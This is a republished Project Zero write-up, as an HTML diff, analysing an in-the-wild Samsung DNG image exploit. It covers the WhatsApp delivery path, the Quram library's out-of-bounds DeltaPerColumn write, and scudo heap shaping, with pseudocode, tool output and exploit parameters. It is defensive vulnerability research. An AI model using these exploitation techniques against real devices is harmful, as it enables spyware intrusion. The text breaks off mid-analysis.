@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>A look at an Android ITW DNG exploit</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.5em; }
+  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
+  img { max-width: 100%; height: auto; border-radius: 8px; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 1em; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
+</style>
+</head>
+<body>
+  <h1>A look at an Android ITW DNG exploit</h1>
+  <div class="metadata">
+    Source: Google Project Zero | Date: 12/12/2025 | Lang: EN |
+    <a href="https://projectzero.google/2025/12/android-itw-dng.html" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div>
+      <article>
+        
+        <section>
+          <h2>Introduction</h2>
+
+<p>Between July 2024 and February 2025, 6 suspicious image files were uploaded to VirusTotal. Thanks to a lead from Meta, these samples came to the attention of Google Threat Intelligence Group.</p>
+
+<p>Investigation of these images showed that these images were DNG files targeting the Quram library, an image parsing library specific to Samsung devices.</p>
+
+<p>On November 7, 2025 Unit 42 released a <a href="https://unit42.paloaltonetworks.com/landfall-is-new-commercial-grade-android-spyware/">blogpost</a> describing how these exploits were used and the spyware they dropped. In this blogpost, we would like to focus on the technical details about how the exploits worked. The exploited Samsung vulnerability was fixed in April 2025.</p>
+
+<p>There has been excellent prior work describing image-based exploits targeting iOS, such as <a href="https://projectzero.google/2021/12/a-deep-dive-into-nso-zero-click.html">Project Zero’s writeup on FORCEDENTRY</a>. Similar in-the-wild “one-shot” image-based exploits targeting Android have received less public documentation, but we would definitely not argue it is because of their lack of existence. Therefore we believe it is an interesting case study to publicly document the technical details of such an exploit on Android.
+</p>
+<h2>Attack vector</h2>
+
+<p>The VirusTotal submission filenames of several of these exploits indicated that these images were received over WhatsApp:</p>
+
+<div><pre><code>IMG-20240723-WA0000.jpg
+IMG-20240723-WA0001.jpg
+IMG-20250120-WA0005.jpg
+WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
+</code></pre></div>
+
+<p>The first filenames listed follow the naming scheme of WhatsApp on Android. The last filename is how WhatsApp Web names image downloads.</p>
+
+<p>The first two images were received on the same day, based on the filename, potentially by the same target. Later analysis showed that the first image targets the jemalloc allocator, while the second one targets the scudo allocator, used on more recent Android versions. This blogpost will detail the scudo version of the exploit as this allocator is more hardened and relevant for recent devices. The concepts and techniques used in the jemalloc version are similar.</p>
+
+<p>The final payload (as we’ll see later) indicates that the exploit expects to run within the <code>com.samsung.ipservice</code> process. How are WhatsApp and <code>com.samsung.ipservice</code> related and what is this process?</p>
+
+<p>The <code>com.samsung.ipservice</code> process is a Samsung-specific system service responsible for providing “intelligent” or AI-powered features to other Samsung applications. It will periodically scan and parse images and videos in Android’s <a href="https://developer.android.com/reference/android/provider/MediaStore"><code>MediaStore</code></a>.</p>
+
+<p>When WhatsApp receives and downloads an image, it will insert it in the <code>MediaStore</code>. This means that downloaded WhatsApp images (and videos) can hit image parsing attack surface within the <code>com.samsung.ipservice</code> application.</p>
+
+<p>However, WhatsApp does not intend to automatically download images from untrusted contacts. (WhatsApp on Android’s logic is a bit more nuanced though. More details can be found in Brendon Tiszka’s <a href="http://project-zero.issues.chromium.org/issues/442425914">report</a> of a different issue). This means that without additional bypasses and assuming the image is sent by an untrusted contact, a target would have to click the image to trigger the download and have it added to the MediaStore. This would mean this is in fact a “1-click” exploit. We don’t have any knowledge or evidence of the attacker using such a bypass though.</p>
+
+<h2>A curious image</h2>
+
+<p>Before we delve into the exploit, let’s gather an understanding of what type of file we are looking at.</p>
+<div><pre><code>
+<b>$ file "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg" </b> 
+WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg: TIFF image data, little-endian, direntries=24, width=1, height=1, bps=8, compression=none, PhotometricInterpretation=BlackIsZero, description={"shape": [1, 1, 1]}, manufacturer=Canon, model=Canon EOS 350D DIGITAL, orientation=upper-left
+<b>$ exiftool "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"</b>
+...
+File Type                       : <b>DNG</b>
+File Type Extension             : dng
+MIME Type                       : image/x-adobe-dng
+...
+Image Width                     : 16
+Image Height                    : 16
+Bits Per Sample                 : 8
+Compression                     : Uncompressed
+Photometric Interpretation      : Color Filter Array
+Image Description               : {"shape": [16, 16]}
+Samples Per Pixel               : 1
+X Resolution                    : 1
+Y Resolution                    : 1
+Resolution Unit                 : None
+Tile Width                      : 16
+Tile Length                     : 16
+Tile Offsets                    : 6596538
+Tile Byte Counts                : 256
+CFA Repeat Pattern Dim          : 2 2
+CFA Pattern 2                   : 0 1 1 2
+CFA Plane Color                 : Red,Green,Blue
+CFA Layout                      : Rectangular
+Active Area                     : 0 0 10 10
+<b>Opcode List 1                   : [opcode 23], [opcode 23], [opcode 23], [opcode 23], ...
+Opcode List 2                   : [opcode 23], [opcode 23], [opcode 23], [opcode 23], [opcode 23], ...
+Opcode List 3                   : TrimBounds, DeltaPerColumn, DeltaPerColumn, DeltaPerColumn, ...</b>
+Subfile Type                    : Full-resolution image
+Strip Offsets                   : 6596794
+Strip Byte Counts               : 1
+...
+</code></pre></div>
+
+<p>(We truncated the “Opcode List” lines, since they contained thousands of opcodes in the actual <code>exiftool</code> output.)</p>
+
+<p>Although the image was saved with a <code>jpeg</code> extension, this image is in fact a Digital Negative (DNG) image. According to <a href="https://en.wikipedia.org/wiki/Digital_Negative">Wikipedia</a>:</p>
+
+<p><em>Digital Negative (DNG) is an open source, lossless, well defined camera RAW data container with the goal to replace a range of proprietary, closed source raw image containers. It has been developed by Adobe.</em><br />
+<em>…</em><br />
+<em>DNG is based on the TIFF/EP standard format, and mandates significant use of metadata. The specification of the file format is open and not subject to any intellectual property restrictions or patents.</em></p>
+
+<p>The image width and height look suspiciously small. And what are these opcode lists?</p>
+
+<h2>Some DNG format basics</h2>
+
+<p>The DNG format specification can be found on <a href="https://helpx.adobe.com/camera-raw/digital-negative.html">Adobe’s website</a>.</p>
+
+<p>DNG files use SubIFD trees, as described in the TIFF-EP specification, in order to contain multiple versions of the same image, such as a preview and a main image. This DNG file has 3 SubIFDs:</p>
+
+<ul>
+  <li>Type “Preview Image” with width 1 and length 1</li>
+  <li>Type “Main Image” with width 16 and length 16</li>
+  <li>Type “Main Image” with width 1 and length 1</li>
+</ul>
+
+<p>As we mentioned already briefly, the sizes of these images are obviously very suspicious, as well as the fact that there are 2 “Main Image” types. We have not figured out what the purpose of the second main image is (if any).</p>
+
+<p>DNG images can contain 3 “opcode lists”. As it will turn out, these “opcodes” will be very important in the context of this exploit. Their goal is to offload some processing steps from the camera to the DNG reader. Their intended use case is for example to perform lens corrections. The reason there are 3 opcode lists is because they are intended to be applied at different moments during the DNG decoding:</p>
+
+<ol>
+  <li>The raw image bytes are read from the DNG file, a.k.a. the “stage 1” image
+    <ul>
+      <li>Opcode list 1 specifies the list of opcodes that should be applied to the stage 1 image</li>
+    </ul>
+  </li>
+  <li>The DNG decoder maps the raw image bytes to linear reference values, which results in a “stage 2” image.
+    <ul>
+      <li>Opcode list 2 specifies the list of opcodes that should be applied to the stage 2 image</li>
+    </ul>
+  </li>
+  <li>The DNG decoder performs <a href="https://en.wikipedia.org/wiki/Demosaicing">demosaicing</a> of the linear reference values, which results in a “stage 3” image.
+    <ul>
+      <li>Opcode list 3 specifies the list of opcodes that should be applied to the stage 3 image.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>Every opcode has an opcode ID and varying number and type of parameters. The <a href="https://helpx.adobe.com/camera-raw/digital-negative.html">latest specification</a> (1.7.1.0 from September 2023), contains 14 distinct opcodes, with opcode IDs going from 1 to 14. Below is an example of opcode description found in the specification:</p>
+
+<p><img alt="" /></p>
+
+<p>For this exploit, only 3 opcodes will be of interest:</p>
+
+<ul>
+  <li><code>TrimBounds</code> (opcode ID 6): This opcode trims the image to a specified rectangle.</li>
+  <li><code>MapTable</code> (opcode ID 7): This opcode maps a specified area and plane range of an image through a 16-bit lookup table.</li>
+  <li><code>DeltaPerColumn</code> (opcode ID 11): This opcode applies a per-column delta (constant offset) to a specified area and plane range of an image.</li>
+</ul>
+
+<p><code>DeltaPerColumn</code> and <code>MapTable</code> perform transformations on areas (defined by a top, left, bottom and right parameter) and plane ranges (defined by a first plane and number of planes parameter).</p>
+
+<p>Looking at the opcode lists in the <code>exiftool</code> output above, we already notice some suspicious things:</p>
+
+<ul>
+  <li>They use opcodes with opcode ID 23 (which <code>exiftool</code> can not map to an opcode name).</li>
+  <li>Typical benign DNG images will contain only a handful of opcodes, while for this image we have thousands of opcodes in the opcode lists.</li>
+</ul>
+
+<h2>Quram</h2>
+
+<p>As we mentioned before, the targeted process based on the payload is the Samsung firmware specific <code>com.samsung.ipservice</code>. The next question then becomes what code in this application performs the DNG decoding.</p>
+
+<p>Looking at a decompiled <code>com.samsung.ipservice</code> APK (which on our test phone was located at <code>/system/priv-app/IPService/IPService.apk</code>), we can see that when the application parses a file with an extension of “jpg”, “jpeg”, “JPG” or “JPEG”, it will call into the Java method <code>com.quramsoft.images.QrBitmapFactory.decodeFile</code> (bundled in the same APK).</p>
+
+<div><pre><code><span>public</span> <span>class</span> <span>com</span><span>.</span><span>quramsoft</span><span>.</span><span>images</span><span>.</span><span>QrBitmapFactory</span> <span>{</span>
+
+   <span>public</span> <span>static</span> <span>Bitmap</span> <span>decodeFile</span><span>(</span><span>String</span> <span>str</span><span>,</span> <span>Options</span> <span>options</span><span>)</span> <span>{</span>
+        <span>Bitmap</span> <span>decodeFile</span> <span>=</span> <span>QuramBitmapFactory</span><span>.</span><span>decodeFile</span><span>(</span><span>str</span><span>,</span> <span>options</span><span>);</span> <span>// [1]; calls into Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2</span>
+                                                                         <span>// Fails</span>
+        <span>if</span> <span>((</span><span>options</span><span>.</span><span>inJustDecodeBounds</span> <span>&amp;&amp;</span> <span>(</span><span>options</span><span>.</span><span>outWidth</span> <span>&gt;</span> <span>0</span> <span>||</span> <span>options</span><span>.</span><span>outHeight</span> <span>&gt;</span> <span>0</span><span>))</span> <span>||</span> <span>decodeFile</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
+            <span>return</span> <span>decodeFile</span><span>;</span>
+        <span>}</span>
+        <span>try</span> <span>{</span>
+            <span>Bitmap</span> <span>decodeFile2</span> <span>=</span> <span>QuramDngBitmap</span><span>.</span><span>decodeFile</span><span>(</span><span>str</span><span>,</span> <span>options</span><span>);</span> <span>// [2]; calls into Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI</span>
+            <span>if</span> <span>(</span><span>options</span><span>.</span><span>outWidth</span> <span>&lt;=</span> <span>0</span><span>)</span> <span>{</span>
+                <span>if</span> <span>(</span><span>options</span><span>.</span><span>outHeight</span> <span>&lt;=</span> <span>0</span><span>)</span> <span>{</span>
+                    <span>return</span> <span>decodeFile2</span><span>;</span>
+                <span>}</span>
+            <span>}</span>
+            <span>options</span><span>.</span><span>outMimeType</span> <span>=</span> <span>"image/dng"</span><span>;</span>
+            <span>return</span> <span>decodeFile2</span><span>;</span>
+        <span>}</span> <span>catch</span> <span>(</span><span>IOException</span> <span>e2</span><span>)</span> <span>{</span>
+            <span>e2</span><span>.</span><span>printStackTrace</span><span>();</span>
+            <span>return</span> <span>null</span><span>;</span>
+        <span>}</span>
+    <span>}</span>
+</code></pre></div>
+
+<p>The “Quram library” is a set of proprietary, closed-source software libraries used by Samsung on its Android devices. Its primary function is to process, parse, and decode various image formats. The library is not developed by Samsung itself. It is created by a third-party software vendor named Quramsoft. Mateusz Jurczyk already <a href="https://projectzero.google/2020/07/mms-exploit-part-1-introduction-to-qmage.html">wrote</a> about this library in 2020.</p>
+
+<p>The <code>QrBitmapFactory.decodeFile</code> method will first try to decode the image using <code>QuramBitmapFactory.decodeFile</code> (see [1]), which calls the exported <code>Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2</code> function of the native library <code>libimagecodec.quram.so</code>. This function handles formats such as PNG, JPEG and GIF, but not DNG. This native library is not part of the <code>IPService</code> APK but rather located at <code>/system/lib64/libimagecodec.quram.so</code>.</p>
+
+<p>When <code>QuramBitmapFactory.decodeFile</code> fails, <code>QrBitmapFactory.decodeFile</code> calls <code>QuramDngBitmap.decodeFile</code> as a fallback (see [2]), which then calls <code>Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI</code>. This function will perform the complete DNG decoding and it is within this code path the vulnerability is triggered and the exploit fully executes.</p>
+
+<p>The call sequence is summarized below:</p>
+
+<div><pre><code>com.quramsoft.images.QrBitmapFactory.decodeFile (com.samsung.ipservice.apk)
+|_ com.quramsoft.images.QuramBitmapFactory.decodeFile (com.samsung.ipservice.apk)
+|  |_  Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2 (/system/lib64/libimagecodec.quram.so) // Fails
+|
+|_ com.quramsoft.images.QuramDngBitmap.decodeFile (com.samsung.ipservice.apk)
+   |_ Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI (/system/lib64/libimagecodec.quram.so) // Triggers bug
+</code></pre></div>
+
+<h2>Analysis setup</h2>
+
+<p>A few tools came in handy when analysing this exploit, which we’ll describe next.</p>
+
+<p>First of all, on the static analysis side, we need an overview of the different opcodes that are called with their parameters. <code>exiftool</code> only gives us a list of the (translated) opcode IDs. To inspect every opcode with its parameters, we can use the <a href="https://cs.android.com/android/platform/superproject/main/+/main:external/dng_sdk/Android.bp;l=206;drc=73bff36f7afeb6a349a44c83d7b13bf4faee4158"><code>dng_validate</code> tool</a> provided by Adobe’s DNG SDK with the <code>-v</code> flag. It will parse the opcode lists and we can post-process its textual output to make sense of the thousands of opcodes. Here is a snippet of what the output looks like, showing us the different parameters of a few <code>TrimBounds</code> and <code>DeltaPerColumn</code> opcodes.</p>
+
+<div><pre><code>...
+Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+
+Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+
+Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+
+Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+
+Parsing OpcodeList3: 5347 opcodes
+
+Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
+Bounds: t=0, l=0, b=1, r=1
+
+Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+AreaSpec: t=0, l=0, b=1, r=1, p=5125:5123, rp=1, cp=1
+Count: 1
+    Delta [0] = 26214.000000
+
+Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+AreaSpec: t=0, l=0, b=1, r=1, p=5127:5125, rp=1, cp=1
+Count: 1
+    Delta [0] = 26214.000000
+
+Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+AreaSpec: t=0, l=0, b=1, r=1, p=5157:5155, rp=1, cp=1
+Count: 1
+    Delta [0] = 26214.000000
+...
+</code></pre></div>
+
+<p>On the dynamic analysis side, debugging <code>com.samsung.ipservice</code> would be very annoying, since it only runs periodically (although there are tricks to force start it). For easier debugging, we reused <a href="https://github.com/flankerhqd/vendor-android-cves/blob/master/dng-fuzzing/dngdriver.c">@flankerhqd’s fuzzing harness</a> (in part based on <a href="https://github.com/googleprojectzero/SkCodecFuzzer">Project Zero’s SkCodecFuzzer</a>), which loads a DNG file provided as a filename into a buffer and passes it to <code>libimagecodec.quram.so</code>’s <code>QrDecodeDNGPreview</code>. We compile it as a standalone binary and can run it under a debugger.</p>
+
+<p>It is noteworthy that <code>QrDecodeDNGPreview</code> (used in our harness) is not the export called by <code>com.samsung.ipservice</code> (which ends up calling <code>QuramDngDecoder::decode</code>). However, if there is no preview image available with one of the JPEG compression types, <code>QrDecodeDNGPreview</code> will call <code>QuramDngDecoder::decodePreview</code>, which will also perform a full DNG decoding and successfully triggers the vulnerability and exploit.</p>
+
+<p>Our test phone was a Samsung Galaxy S21 5G (SM-G991B) running firmware version G991BXXSAFXCL, which has a security patch level of 2024-04-01.</p>
+
+<h2>The bug</h2>
+
+<p>Using the <code>dng_validate</code> tool we can make a listing of the sequence of opcodes called and their number of repetitions:</p>
+
+<div><pre><code>$ grep Opcode dng_validate.out  | uniq -c
+      1 OpcodeList1: count = 320004, offset = 814
+      1 OpcodeList2: count = 3844, offset = 320818
+      1 OpcodeList3: count = 6271556, offset = 324662
+      1 Parsing OpcodeList1: 20000 opcodes
+  20000 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+      1 Parsing OpcodeList2: 240 opcodes
+    240 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+      1 Parsing OpcodeList3: 5347 opcodes
+      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
+    480 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      1 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      2 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      1 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+    400 Opcode: TrimBounds, minVersion = 1.4.0.1, flags = 1
+      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     48 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+    216 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     24 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+     15 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      1 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+    240 Opcode: TrimBounds, minVersion = 1.4.0.1, flags = 1
+      2 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     48 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      2 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+    216 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+     12 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+      6 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+   2438 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+   1040 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
+      1 Opcode: ScalePerColumn, minVersion = 1.4.0.0, flags = 1
+</code></pre></div>
+
+<p>The specification mentions that if the flag bit is set (which it is), opcodes with unknown opcode IDs should be skipped. So let’s for the moment ignore the “Unknown” opcodes with ID 23 (more on them later).</p>
+
+<p>Let’s look at the first 2 known opcodes, which occur in opcode list 3:</p>
+
+<div><pre><code>$ grep -A8 TrimBounds dng_validate.out  | head -n 8
+Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
+Bounds: t=0, l=0, b=1, r=1
+
+Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
+AreaSpec: t=0, l=0, b=1, r=1, p=5125:5123, rp=1, cp=1
+Count: 1
+    Delta [0] = 26214.000000
+
+</code></pre></div>
+
+<p>The DNG opcode parameters are embedded directly in the file. DeltaPerColumn takes a list of deltas to be applied to each pixel and the “Area Spec” to work over: top, left, right, bottom coordinates, the plane and total number of planes being targeted, and the length of each row and column (rowPitch and colPitch). These values are controllable by the attacker.</p>
+
+<p>The “first plane” (5125) and “number of planes” (5123) parameters of the <code>DeltaPerColumn</code> opcode are very suspicious. At stage 3 in the DNG decoding, the number of planes will be 3 (R, G and B), as can be seen in the <a href="https://en.wikipedia.org/wiki/Color_filter_array">CFA</a> related data of the <code>exiftool</code> output. The first value (5125) is the first plane to apply the DeltaPerColumn to, while the second value (5123) is the number of planes. Since the planes are numbered 0 to 2, these values are clearly out of bounds.</p>
+
+<p>Let’s have a look at <code>QuramDngOpcodeDeltaPerColumn::processArea</code>, which is the handler for the <code>DeltaPerColumn</code> opcode. Below are the relevant lines of that function for the vulnerability. (Variable names are chosen by us since this is a closed source library)</p>
+
+<div><pre><code><span>__int64</span> <span>__fastcall</span> <span>QuramDngOpcodeDeltaPerColumn</span><span>::</span><span>processArea</span><span>(</span>
+        <span>QuramDngOpcode</span> <span>*</span><span>opcode</span><span>,</span>
+        <span>QuramDngDecoder</span> <span>*</span><span>decoder</span><span>,</span>
+        <span>QuramDngImage</span> <span>*</span><span>image</span><span>,</span>
+        <span>QuramDngRect</span> <span>*</span><span>rect</span><span>)</span>
+<span>{</span>
+<span>...</span>
+    <span>image_buffer</span> <span>=</span> <span>image</span><span>-&gt;</span><span>buffer</span><span>;</span>
+<span>...</span>
+                <span>image_number_of_planes</span> <span>=</span> <span>image_buffer</span><span>-&gt;</span><span>planes</span><span>;</span>  <span>// 3</span>
+                <span>opcode_first_plane</span> <span>=</span> <span>opcode</span><span>-&gt;</span><span>plane</span><span>;</span>  <span>// 5125</span>
+<span>....</span>
+                <span>opcode_number_of_planes</span> <span>=</span> <span>opcode</span><span>-&gt;</span><span>planes</span><span>;</span>  <span>// 5123</span>
+                <span>opcode_last_plane</span> <span>=</span> <span>image_number_of_planes</span> <span>+</span> <span>opcode_number_of_planes</span><span>;</span>  <span>// 3 + 5123 = 5126</span>
+<span>...</span>
+                    <span>if</span> <span>(</span><span>opcode_first_plane</span> <span>&lt;</span> <span>opcode_last_plane</span> <span>)</span>  <span>// 5125 &lt; 5126</span>
+                    <span>{</span>
+<span>...</span>
+                            <span>current_plane</span> <span>=</span> <span>opcode_first_plane</span><span>;</span>  <span>// 5125</span>
+<span>...</span>
+                                <span>do</span>
+                                <span>{</span>
+<span>...</span>                                 <span>// Add delta to the value in the raw pixel buffer at offset corresponding to plane `current_plane`, i.e. 5125!</span>
+                                    <span>current_plane</span><span>++</span><span>;</span>
+                                <span>}</span>
+                                <span>while</span> <span>(</span> <span>current_plane</span> <span>!=</span> <span>opcode_last_plane</span> <span>);</span>  <span>// 5125 != 5126</span>
+<span>...</span>
+<span>}</span>
+</code></pre></div>
+
+<p>The function takes a few objects with Quram specific structure as arguments. The <code>QuramDngImage</code> describes the image on which the opcode is to be applied (which is the stage 3 image at this point). The <code>QuramDngOpcode</code> contains the <code>DeltaPerColumn</code> parameters. The function has a triple nested loop to iterate over the width, length and planes of the area. For every such triplet (width,length,plane) it calculates the offset in the raw pixel buffer and adds a delta to it. Only the plane loop is relevant for the bug and displayed in the code above.</p>
+
+<div><p>Below is an example of a 6x6 image with its different color planes and to what offsets the pixel values map in the raw pixel buffer. During stage 2 and stage 3 image processing, each pixel value in each color plane takes 16 bits.</p><p>
+
+<img alt="" />
+<br />
+There are two issues in that handler function:</p></div>
+
+<ul>
+  <li><code>opcode_last_plane</code> is calculated incorrectly. It should be <code>opcode_first_plane + opcode_number_of_planes</code> (as will be the case in the patched version). This by itself is a correctness issue (and a pretty basic one that would be expected to surface by normal usage or testing of the library).</li>
+  <li>The plane used in the offset calculation is bounded by <code>opcode_last_plane</code>, but at no point is it checked that <code>opcode_last_plane</code> is within the number of planes that the image contains.</li>
+</ul>
+
+<p>The actual values from the exploit are annotated as comments in the code snippet. With these values, the plane loop will be executed exactly once. The width and length loop will also be executed only once, since <code>t=0, l=0, b=1, r=1</code>. This means exactly one write will happen. Since the stage 3 image in the exploit has a width 1 and length 1, the write will happen at offset 5125 x 2 = 10250 from the raw pixel buffer.</p>
+
+<p>Not only the offset of the write is controlled, the value to be added to the current value in the raw pixel buffer is also fully controlled, since it is an opcode parameter. In this case it is 26214.0 (or 0x6666). This vulnerability gives thus a very strong primitive from the start: the attacker can add chosen values at chosen offsets with respect to the raw pixel buffer.</p>
+
+<p>Now why do we need that TrimBounds opcode before triggering the bug? That will become clear when we discuss the heap shaping strategy.</p>
+
+<h2>Exploit flow</h2>
+
+<h3>Heap shaping strategy</h3>
+
+<p>Since the buffers containing the pixel values are dynamically allocated on the heap, it is important to understand what heap allocations the Quram library makes and how these allocations behave to understand the heap layout at the time of the vulnerability triggering.</p>
+
+<p>As we mentioned earlier, exploits exist for Android versions using both jemalloc and scudo allocator. We will analyse the exploit targeting the scudo allocator, since this is the common allocator on modern Android versions. The same techniques were used in a different way in the jemalloc exploit.</p>
+
+<h4>Scudo</h4>
+
+<p>We will not give a detailed overview of Android’s scudo allocator, which is being used here for the allocations, since <a href="https://www.synacktiv.com/en/publications/behind-the-shield-unmasking-scudos-defenses">excellent documentation by Synacktiv</a> already exists, to which we refer. We will only mention the elements that are important for this exploit.</p>
+
+<p>Scudo allocates objects in different heap regions depending on the allocation size. For two objects of different types to land near each other, they need to belong to the same size class. The size required from the allocator’s point of view for a “block” is composed of:</p>
+
+<ul>
+  <li>A header of 0x10 bytes</li>
+  <li>The chunk with the user requested size. A pointer to the chunk is returned to the caller.</li>
+</ul>
+
+<p>New allocations are retrieved via “transfer batches”. The number of allocations in a transfer batch depends on the size class. For the size we will be interested in (chunks of 0x30 bytes, i.e. blocks of 0x40 bytes), there are 52 allocations in a transfer batch. The allocations within a transfer batch are returned in a randomized order, however subsequent transfer batches are just laid out linearly in memory. A consequence of this is that given enough allocations between two allocations of the same size, an attacker can be confident that the last allocation falls after the first allocation.</p>
+
+<p>Lastly, scudo supports a quarantine mechanism that prevents freed allocations to be returned immediately on a next allocation request. However on Android this quarantine mechanism is disabled. The consequence is that a freed object will be directly reallocated on the next allocation request of the same size.</p>
+
+<h4>Quram’s heap allocations</h4>
+
+<p>With a basic understanding of scudo’s allocation behaviour, let’s look at the specific heap allocations Quram makes when decoding a DNG file.</p>
+
+<p>First, when Quram parses the opcode lists in the DNG file, it will allocate one <code>QuramDngOpcode</code> object per opcode. These objects contain the parameters of the opcode, as well as a vtable pointer to the handlers for that opcode. The size of such an object depends thus on the number and type of parameters and hence on the type of opcode. The size of the different opcodes can be looked up in <code>QuramDngDecoder::makeDngOpcode</code>. For the exploit at hand, only the following opcode sizes are relevant:</p>
+
+<ul>
+  <li><code>DeltaPerColumn</code> (opcode ID 11): 0x50 bytes</li>
+  <li><code>MapTable</code> (opcode ID 7): 0x50 bytes</li>
+  <li><code>TrimBounds</code> (opcode ID 6): 0x30 bytes</li>
+  <li><code>Unknown</code> (starting at opcode ID 14, such as opcode ID 23 in the exploit): 0x30 bytes</li>
+</ul>
+
+<p>This means <code>TrimBounds</code> and <code>Unknown</code> opcodes will land in the same heap region, distinct from the heap region containing the <code>DeltaPerColumn</code> and <code>MapTable</code> opcodes.</p>
+
+<p>Next, for every stage image, Quram will allocate three heap buffers:</p>
+
+<ul>
+  <li>A <code>QuramDngImage</code> of fixed size 0x30, which describes the image</li>
+  <li>A buffer for the pixel values of variable size (depending on width, height and number of planes)</li>
+  <li>A <code>QuramDngPixelBuffer</code> of fixed size 0x40, which describes the contents of the buffer</li>
+</ul>
+
+<p>These different objects and their relationship are illustrated below:
+<br />
+<img alt="" />
+<br />
+There are two “pixel buffers” at play here, which can be a bit confusing: the <code>QuramDngPixelBuffer</code> object and the raw buffer with pixel values. In what comes, when we talk about “raw pixel buffer”, we refer to the latter.</p>
+
+<p><code>QuramDngImage</code> and <code>QuramDngPixelBuffer</code> will land in different heap regions since they belong to different scudo allocation class sizes. The raw pixel buffer may end up in the same heap region as a <code>QuramDngImage</code> depending on its size. Its size is calculated by <code>ComputeBufferSize</code>. For the dimensions of the stage 3 image of the exploit (width 1 by length 1 with 3 color planes) it will calculate a size of 0x30 bytes (even though 6 bytes would suffice). For the stage 1 and stage 2 images, the sizes are different and will be allocated in a different heap region.</p>
+
+<p>To conclude, both the <code>TrimBounds</code> opcodes, the <code>Unknown</code> opcodes, the <code>QuramDngImage</code> objects as well as potentially the raw pixel buffer will end up in the same heap region.</p>
+
+<h4>Final heap layout</h4>
+
+<p>We can now study the sequence of events during DNG decoding to understand the heap layout at the time of the vulnerability trigger:</p>
+
+<ul>
+  <li><code>QuramDngDecoder::getRegionStage1Image</code> will allocate a “stage 1” QuramDngImage (size 0x30)</li>
+  <li><code>QuramDngDecoder::readStage1Image</code> parses the 3 opcode lists and allocates a QuramDngOpcode structure per opcode. As we saw, only <code>TrimBounds</code> and <code>Unknown</code> opcodes will land in the same heap region of 0x30 bytes chunks, which is of interest to us. Other opcodes are allocated in different heap regions.</li>
+</ul>
+
+<div><pre><code>$ grep -E 'OpcodeList|TrimBounds|Unknown' dng_validate.out  | uniq -c
+      1 OpcodeList1: count = 320004, offset = 814
+      1 OpcodeList2: count = 3844, offset = 320818
+      1 OpcodeList3: count = 6271556, offset = 324662
+      1 Parsing OpcodeList1: 20000 opcodes
+  20000 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+      1 Parsing OpcodeList2: 240 opcodes
+    240 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
